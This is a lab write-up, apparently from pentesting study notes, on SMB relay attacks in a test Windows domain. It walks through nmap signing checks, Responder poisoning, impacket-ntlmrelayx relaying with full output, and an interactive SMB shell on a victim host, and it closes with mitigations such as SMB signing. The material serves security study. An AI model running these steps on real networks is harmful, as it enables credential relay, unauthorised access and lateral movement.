
![](assets/Pasted%20image%2020241217203937.png)

# [What is SMB Relay Attack?]()

An **SMB relay attack** is a type of **Man-in-the-Middle (MitM)** attack that exploits the **SMB** protocol. In this attack, an adversary relays SMB authentication requests from a victim to a legitimate server, effectively **impersonating the victim to gain unauthorised access.**

An SMB relay attack is a type of Man-in-the-Middle (MitM) attack that exploits the Server Message Block (SMB) protocol, commonly used in Windows environments for file sharing, printing services, and inter-process communication. In this attack, an adversary relays SMB authentication requests from a victim to a legitimate server, effectively impersonating the victim to gain unauthorised access.

# [How SMB Relay Attacks Work?]()

1. **Intercept SMB Traffic**: The attacker positions themselves between the client (victim) and the server, intercepting SMB traffic.
2. **Relay Authentication**: When the client attempts to authenticate to a malicious SMB server (controlled by the attacker), the attacker captures the credentials (e.g., NTLM challenge/response).
3. **Forward to Legitimate Server**: The attacker forwards the captured credentials to the legitimate server to authenticate as the victim.
4. **Gain Unauthorised Access**: If the server accepts the relayed credentials, the attacker gains access to resources under the victim's permissions.

# [Steps of SMB Relay Attack:]()

## [Responder]()

-  Check if clients are vulnerable to SMB relay attack (look for **message signing enabled but not required**)

***Domain controller***
```
┌─[hexadivine@parrot]─[~]
└──╼ $nmap -p445 -script=smb2-security-mode 192.168.0.2 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 20:58 IST
Nmap scan report for 192.168.0.2 (192.168.0.2)
Host is up (0.00057s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds

```

***Client 1: Spiderman***
```
┌─[hexadivine@parrot]─[~]
└──╼ $nmap -p445 -script=smb2-security-mode 192.168.0.3 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 20:56 IST
Nmap scan report for 192.168.0.3 (192.168.0.3)
Host is up (0.00067s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
```

***Client 2: Ironman***
```
┌─[hexadivine@parrot]─[~]
└──╼ $nmap -p445 -script=smb2-security-mode 192.168.0.4 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 20:58 IST
Nmap scan report for 192.168.0.4 (192.168.0.4)
Host is up (0.0011s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
```

- Configure the responder for this attack (turn off SMB and HTTP)

```
sudo nano /etc/responder/Responder.conf
```
![](assets/Pasted%20image%2020241217204838.png)

- Listen for LLMNR request using responder

```
┌─[hexadivine@parrot]─[~]
└──╼ $sudo responder -I wlp0s20f3 -dwPv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [OFF]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [OFF]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlp0s20f3]
    Responder IP               [192.168.0.105]
    Responder IPv6             [fe80::7635:bf9e:3643:497f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-6AVN6QJO1Z1]
    Responder Domain Name      [QQVB.LOCAL]
    Responder DCE-RPC Port     [46425]

[+] Listening for events...

```

- Add target IPs to the file

![](assets/Pasted%20image%2020241217210326.png)

- Start `impacket-ntlmrelayx`

```
┌─[hexadivine@parrot]─[/tmp]
└──╼ $sudo impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support  -i
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

- On Spiderman VM login with `marvel\pparker` and try connecting to random server

![](assets/Pasted%20image%2020241217211048.png)

- Check `impacket-ntlmrelayx`
	- We can see `Authenticating against smb://192.168.0.3 as MARVEL/PPARKER FAILED` as `192.168.0.3` belongs to Spiderman VM.
	- and `Authenticating against smb://192.168.0.4 as MARVEL/PPARKER SUCCEED` as `192.168.0.4` belongs to Ironman VM as it is relaying the attack.

```
┌─[hexadivine@parrot]─[/tmp]
└──╼ $sudo impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support  -i
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/PPARKER@192.168.0.3 controlled, attacking target smb://192.168.0.3
[-] Authenticating against smb://192.168.0.3 as MARVEL/PPARKER FAILED
[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/PPARKER@192.168.0.3 controlled, attacking target smb://192.168.0.4
[*] Authenticating against smb://192.168.0.4 as MARVEL/PPARKER SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/PPARKER@192.168.0.3 controlled, attacking target smb://192.168.0.3
[-] Authenticating against smb://192.168.0.3 as MARVEL/PPARKER FAILED
[*] SMBD-Thread-8 (process_request_thread): Connection from MARVEL/PPARKER@192.168.0.3 controlled, but there are no more targets left!
[*] HTTPD(80): Client requested path: /0686ag6ka5
[*] HTTPD(80): Client requested path: /0686ag6ka5
[*] HTTPD(80): Client requested path: /0686ag6ka5
[*] HTTPD(80): Connection from MARVEL/PPARKER@192.168.0.3 controlled, but there are no more targets left!
[*] SMBD-Thread-11 (process_request_thread): Connection from MARVEL/PPARKER@192.168.0.3 controlled, but there are no more targets left!

```
- Use `nc` to get interactive mode.

```
┌─[hexadivine@parrot]─[/tmp]
└──╼ $nc 127.0.0.1 11000
Type help for list of commands
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 lls {dirname} - lists all the files on the local filesystem.
 tree {filepath} - recursively lists all files in folder and sub folders
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)
```

# [Mitigation Strategies]()

## [Enable SMB signing on all devices]()

- pro: completely stops attack
- con: can cause performance issues

## [Disable NTLM authentication]()

- pro: completely stops attack
- con: if kerberos stops working, windows defaults back to NTLM

## [Account tiering]()

- pro: limit domain admins to specific tasks(e.g. only log onto servers with need for DA)
- con: enforcing policy may be difficult

## [Local admin restriction]()

- pro: can prevent lateral movement
- con: potential increase in amount of service desk tickets.